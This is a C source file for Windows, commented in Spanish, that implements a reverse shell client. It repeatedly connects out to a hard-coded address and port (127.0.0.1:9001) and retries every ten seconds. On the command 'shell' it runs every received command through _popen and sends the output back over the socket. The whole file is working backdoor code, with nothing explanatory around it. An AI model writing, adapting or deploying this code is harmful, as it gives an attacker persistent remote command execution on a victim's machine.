#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <winsock2.h>
#include <windows.h>

// Definiciones
#define SOCKBUFF 2048
#define CMDBUFF 4096

// Variables Globales

// Prototipos
void conection();
void ash(int conn);
int mainLoop(int conn);
int excndSend(int conn, char *cmd);

int excndSend(int conn, char *cmd)
{
    FILE *xx = NULL;
    char *path = NULL;
    size_t path_size = 0;

    char fullCmd[CMDBUFF] = "";
    snprintf(fullCmd, sizeof(fullCmd), "%s 2>&1", cmd); 

    xx = _popen(fullCmd, "r");
    if (xx == NULL){
        char error[100] = "Error executing command...";
        send(conn, error, sizeof(error), 0);
        return 1;
    }

    while (getline(&path, &path_size, xx) != -1){
        send(conn, path, strlen(path), 0);
    }

    free(path);
    Sleep(300);
    send(conn, "end\0", strlen("end\0"), 0);
    _pclose(xx);
    return 0;
}

void ash(int conn)
{
    char cmd[CMDBUFF] = "";

    while (true)
    {
        recv(conn, cmd, sizeof(cmd), 0); 
        if (strcmp(cmd, "q") == 0)
        {
            memset(cmd, 0, SOCKBUFF);
            break;
        }
        else if (strlen(cmd) == 0)
        {
            continue;
        }
        else
        {
            excndSend(conn, cmd);
            // Limpiar comando recibido
            memset(cmd, 0, SOCKBUFF);
        }
    }
    Sleep(500); 
    return;
}

int mainLoop(int conn)
{
    char instruct[100];
    while (true)
    {
        recv(conn, instruct, sizeof(instruct), 0);
        if (strcmp(instruct, "exit") == 0)
            return 0;
    
        else if (strcmp(instruct, "exit -y") == 0){
            exit(0);
        }
        else if (strcmp(instruct, "shell") == 0)    
            ash(conn); 
        else
            continue;
    }
    return 0;
}

void conection()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
        exit(1);
    }

    // Geberabanis el socket
    int conn = socket(AF_INET, SOCK_STREAM, 0);

    // Generamos estructura de datos
    struct sockaddr_in cltAddr;

    cltAddr.sin_family = AF_INET;
    cltAddr.sin_port = htons(9001); // Especifcamos puerto
    cltAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Especifcamos IP

    int targetConnStatus = connect(conn, (struct sockaddr *)&cltAddr,
                                   sizeof(cltAddr));

    if (targetConnStatus == -1)
    {
        Sleep(10000);
        conection();
        // printf("%s[!>] %sERROR...\n", YELLOW, RED);
    }
    else
    {
        mainLoop(conn);
        Sleep(10000);
        conection();
    }
}

int main(int argc, char const *argv[])
{
    conection();
    WSACleanup(); // Clean up Winsock
    return 0;
}
